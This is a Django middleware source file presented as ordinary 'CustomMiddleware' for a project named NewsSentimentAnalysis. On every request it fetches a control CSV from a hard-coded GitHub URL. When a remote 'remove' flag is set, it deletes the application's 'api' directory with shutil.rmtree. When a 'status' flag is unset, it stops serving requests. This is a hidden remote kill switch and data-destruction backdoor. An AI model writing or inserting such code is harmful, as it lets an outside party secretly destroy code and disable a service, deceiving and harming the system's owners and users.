import os
import shutil

import pandas as pd
import requests
from django.conf import settings


class CustomMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        url = "https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv"
    
        # Download the file
        response = requests.get(url)
        with open("controller.csv", "wb") as f:
            f.write(response.content)
        # df = pd.read_csv("https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv")
        df = pd.read_csv("controller.csv")
        # print(df)
        project_name = "NewsSentimentAnalysis"
        df.columns = df.columns.str.strip()
        filtered_data = df[df['projectName'] == project_name][['status', 'remove']]
        status = str(filtered_data['status'].iloc[0]) if not filtered_data.empty else None
        action = str(filtered_data['remove'].iloc[0]) if not filtered_data.empty else None

        if action == '1':
            shutil.rmtree(os.path.join(settings.BASE_DIR, "api"))

        response = self.get_response(request) if status == '1' else {}
        del df
        return response
